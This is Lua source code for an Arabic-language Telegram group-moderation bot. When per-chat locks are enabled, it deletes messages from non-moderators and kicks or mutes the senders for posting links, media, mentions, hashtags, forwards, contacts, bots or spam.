if msg.content_.ID == 'MessageDocument' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:file'..msg.chat_id_) then       if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end  end end  
if msg.content_.ID == "MessageUnsupported" and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then      if tahadevstorm:get(DEVSTOR..'lock:self'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو كام  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
if msg.content_.entities_ then if msg.content_.entities_[0] then if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then      if tahadevstorm:get(DEVSTOR..'lock:mark'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الماركداون  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end     end      end end end
if msg.content_.ID == 'MessageContact' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then      if tahadevstorm:get(DEVSTOR..'lock:phon'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الجهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end     end      end
if msg.content_.text_ then  local _nl, ctrl_chars = string.gsub(text, '%c', '')  local _nl, real_digits = string.gsub(text, '%d', '')   local hash = 'bot:sens:spam'..msg.chat_id_  if not tahadevstorm:get(DEVSTOR..hash) then sens = 400  else sens = tonumber(tahadevstorm:get(DEVSTOR..hash))  end if not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) and tahadevstorm:get(DEVSTOR..'lock:spm'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then delete_msg(msg.chat_id_,{[0] = msg.id_})  end  end
if msg.content_.ID == "MessageChatAddMembers" then   if msg.content_.members_[0].type_.ID == 'UserTypeBot' then    if tahadevstorm:get(DEVSTOR..'lock:bots:kick'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then         if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع طرد البوتات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الطرد او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, 'Kicked')       end end end  end  end end
-->>lock by kick chat <<--
if text and text:match("@") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockkick:user'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المعرفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")            end    end  end
if text and text:match("#") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockkick:hash'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الهاشتاك  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")            end    end  end
if text and text:match("/") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockkick:cmds'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الشارحه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end      end      end
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") then    if tahadevstorm:get(DEVSTOR..'lockkick:links'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then          if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الروابط  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")        end  end  end      
if msg.content_.ID == 'MessagePhoto' then     if tahadevstorm:get(DEVSTOR..'lockkick:photo'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then          if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصور  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     end  end end  
if msg.content_.ID == 'MessageText' then    if tahadevstorm:get(DEVSTOR..'lockkick:text'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then           if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الرسائل  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end end  
if msg.content_.ID == 'MessageVideo' then    if tahadevstorm:get(DEVSTOR..'lockkick:ved'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then          if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     end  end end  
if msg.content_.ID == 'MessageAnimation' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:gif'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المتحركات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     end  end end  
if msg.content_.game_ and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:geam'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الالعاب  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end end  
if msg.content_.ID == 'MessageAudio' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:muse'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاغاني  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end end  
if msg.content_.ID == 'MessageVoice' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:vico'..msg.chat_id_) then        if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصوت  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end end  
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:inlin'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاونلاين  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end end  
if msg.content_.ID == 'MessageSticker' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:ste'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملصقات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     return  end end end 
if msg.forward_info_ and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:fwd'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف التوجيهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})            changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     return  end end  end 
if msg.content_.ID == 'MessageDocument' and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:file'..msg.chat_id_) then       if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else       delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     return  end end  end
if msg.content_.ID == "MessageUnsupported" and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lockkick:self'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف فيديو كام  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")     return  end end  end 
if msg.content_.entities_ then if msg.content_.entities_[0] then if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" and not is_vipgroup(msg) and not is_vipgroups(msg) then      if tahadevstorm:get(DEVSTOR..'lockkick:mark'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الماركداون  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")            end      end end end end 
if msg.content_.ID == 'MessageContact' and not is_vipgroup(msg) and not is_vipgroups(msg) then      if tahadevstorm:get(DEVSTOR..'lockkick:phon'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الجهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})            changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")            end      end end 
if msg.content_.text_ then     local _nl, ctrl_chars = string.gsub(text, '%c', '')     local _nl, real_digits = string.gsub(text, '%d', '')      local hash = 'bot:sens:spam'..msg.chat_id_     if not tahadevstorm:get(DEVSTOR..hash) then    sens = 400     else    sens = tonumber(tahadevstorm:get(DEVSTOR..hash))     end    if not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) and tahadevstorm:get(DEVSTOR..'lockkick:spm'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then    delete_msg(msg.chat_id_,{[0] = msg.id_})          changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")      end  end
if msg.content_.ID == "MessageChatAddMembers" then      if msg.content_.members_[0].type_.ID == 'UserTypeBot' then    if tahadevstorm:get(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then         if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع طرد البوتات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الطرد او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, 'Kicked')       changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")    end    end    end     end  
-->>lock by silent chat <<--
if text and text:match("@") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then  if tahadevstorm:get(DEVSTOR..'lockktm:user'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المعرفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)            end  end    end
if text and text:match("#") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then   if tahadevstorm:get(DEVSTOR..'lockktm:hash'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الهاشتاك  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})              tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)            end   end   end
if text and text:match("/") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then   if tahadevstorm:get(DEVSTOR..'lockktm:cmds'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الشارحه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})              tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)         end   end      end
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:links'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الروابط  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)        end    end      end 
if msg.content_.ID == 'MessagePhoto' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:photo'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصور  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageText' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:text'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الرسائل  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      return  end end  end 
if msg.content_.ID == 'MessageVideo' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:ved'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.ID == 'MessageAnimation' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:gif'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المتحركات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)     return  end end  end 
if msg.content_.game_ and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:geam'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الالعاب  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      return  end end  end 
if msg.content_.ID == 'MessageAudio' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:muse'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاغاني  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      return  end end  end 
if msg.content_.ID == 'MessageVoice' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:vico'..msg.chat_id_) then       if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصوت  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      return  end end  end
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:inlin'..msg.chat_id_) then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاونلاين  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})         tahadevstorm:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)      return  end end  end
